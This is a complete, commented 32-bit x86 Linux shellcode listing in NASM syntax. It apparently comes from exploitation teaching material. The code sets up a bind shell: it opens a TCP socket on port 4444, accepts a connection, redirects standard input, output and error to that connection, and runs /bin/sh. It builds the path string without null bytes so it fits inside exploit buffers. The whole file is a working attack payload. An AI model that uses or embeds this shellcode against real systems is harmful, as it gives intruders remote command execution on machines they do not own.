BITS 32
; s = socket(2,1,0)
push BYTE 0x66    ; socketcall is syscall 102 (0x66)
pop eax
cdq               ; Zero out edx to use as a null dword later
xor ebx, ebx      ; Ebx will contain type of socket call
inc ebx           ; 1 = SYS_SOCKET = socket()
push edx          ; build arg array { protocol = 0,
push BYTE 0x1     ;  (in reverse)     SOCK_STREAM = 1,
push BYTE 0x2     ;                   AF_INET = 2 }
mov ecx, esp      ; ecx = ptr to arg array
int 0x80          ; after syscall eax has socket file descriptor

xchg esi, eax     ; save socket FD in esi for later

; bind (s, [2, 4444, 0], 16)
push BYTE 0x66    ; socketcall is syscall 102 (0x66)
pop eax
inc ebx           ; ebx = 2 = SYS_BIND = bind()
push edx          ; Build sockaddr struct { INADDR_ANY = 0,
push WORD 0x5c11  ;    (in reverse order)   PORT = 4444
push WORD bx      ;                         AF_INET = 2 }
mov ecx, esp      ; ecx = struct ptr ^^^
push BYTE 16      ; argv { sizeof(server struct) = 16,
push ecx          ;        server struct pointer,
push esi          ;        socket FD }
mov ecx, esp      ; ecx = argv ptr ^^^
int 0x80          ; syscall socket call, eax = 0 on success

; listen(s, 0)
mov BYTE al, 0x66 ; socketcall (syscall 102)
inc ebx
inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
push ebx          ; argv { backlog = 4,
push esi          ;        socket FD }
mov ecx, esp      ; ecx = argv ptr ^^^
int 0x80

; c =accept(s, 0, 0)
mov BYTE al, 0x66 ; socketcall syscall
inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
push edx          ; argv { socklen = 0,
push edx          ;        sockaddr prt = NULL,
push esi          ;        socket FD }
mov ecx, esp      ; argv ptr ^^^
int 0x80          ; eax connected socket FD

; dup2(connected socket, { all 3 standard IO FDs })
xchg eax, ebx     ; Put c_sock_FD in ebx and 5 in eax
push BYTE 0x2     ; ecx starts at 2
pop ecx
dup_loop:
mov BYTE al, 0x3F ; dup2 syscall #63
int 0x80          ; dup(c, 0)
dec ecx           ; count down to 0
jns dup_loop      ; If the sign flag is not set ecx is not nnegative

; execve(const *char filename, char *const argv[], char *const envp[])
mov BYTE al, 11   ; execve is syscall 11
push edx          ; push some nulls onto the stack
mov ebx, 0x68732e2e  ; hs..
inc bh               ; hs/.
inc ebx              ; hs//
push ebx             ; put it on the stack
mov ebx, 0x6e69622e  ; nib.
inc ebx              ; nib/
push ebx             ; put it on the stack
mov ebx, esp         ; ebx ptr to filename
push edx             ; null onto stack
mov edx, esp         ; empty array from envp
push ebx             ; put string ptr above nulls
mov ecx, esp         ; argv array with string ptr
int 0x80             ; execve('/bin//sh', ['/bin//sh', NULL])

